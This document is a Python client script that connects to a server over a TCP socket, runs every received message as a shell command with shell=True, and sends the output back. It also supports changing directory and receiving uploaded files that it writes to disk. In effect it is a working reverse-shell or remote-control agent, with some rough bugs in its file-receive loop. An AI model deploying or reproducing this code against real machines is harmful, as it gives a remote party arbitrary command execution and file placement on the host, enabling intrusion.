#!/usr/bin/env python3
import socket
import os
import subprocess
import pathlib
import tqdm
import time

r = open("../port", 'r')
port = int(r.readline())
r.close()

PORT = port
HEADER = 64
#PORT = 5050
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "exit"
SERVER = socket.gethostbyname(socket.gethostname())
ADDR = (SERVER, PORT)
BUFFER_SIZE = 4096
SEPARATOR = "<SEPARATOR>"


client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)


def execute_command(conn, cmd_str):
    try:
        proc = subprocess.Popen(cmd_str, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except:
        print("Command failed " + cmd_str)
    stdoutput = (proc.stdout.read() + proc.stderr.read()).decode()
    snd_msg(conn, stdoutput)

def snd_msg(conn, msg):
    message = msg.encode(FORMAT)
    length = str(len(message)).encode(FORMAT)
    length += b' ' * (HEADER - len(length))
    conn.send(length)
    conn.send(message)

def recieve_msg(conn):
    msg_length = conn.recv(HEADER).decode(FORMAT)
    if msg_length:
        msg_length = int(msg_length)
        msg = conn.recv(msg_length).decode(FORMAT)
        return msg
    else:
        return ""

def listen_to_server(conn):
    print(f"Connected to {SERVER}")
    connected = True
    while connected:
        msg_length = conn.recv(HEADER).decode(FORMAT)
        if msg_length:
            msg_length = int(msg_length)
            msg = conn.recv(msg_length).decode(FORMAT)
            print(msg)

            if msg == DISCONNECT_MESSAGE:
                connected = False
            elif msg[:2] == "cd":
                try:
                    abs_path = os.path.abspath(os.path.join(os.getcwd(), msg[3:]))
                    os.chdir(abs_path)
                    snd_msg(conn, os.getcwd())
                except:
                    snd_msg(conn, "Failed to change directory.")

            elif msg[:3] == "put":
                # receive the file infos
                # receive using client socket, not server socket
                received = recieve_msg(client)
                filename, filesize = received.split(SEPARATOR)
                print(f'filename: {filename}, fsize: {filesize}')
                # remove absolute path if there is
                filename = os.path.basename(filename)
                # convert to integer
                filesize = int(filesize)

                # start receiving the file from the socket
                # and writing to the file stream
                print("before")
                progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
                bytes_left = filesize
                with open(filename, "wb") as f:
                    while bytes_left > 0:
                        if bytes_left < BUFFER_SIZE:
                            bytes_to_write = bytes_left
                        else:
                            bytes_to_write = BUFFER_SIZE
                        # read 1024 bytes from the socket (receive)
                        bytes_read = client.recv(bytes_to_write)
                        print(bytes_read)
                        bytes_left = bytes_left - bytes_to_write
                        print(f'Bytes left {str(bytes_left)}')
                        # write to the file the bytes we just received
                        f.write(bytes_read)
                        # update the progress bar
                        progress.update(len(bytes_read))
                progress.update(filesize)
                time.sleep(1)
                print("Done")
                f.close()
            else:
                execute_command(conn, msg)
    conn.close()

listen_to_server(client)
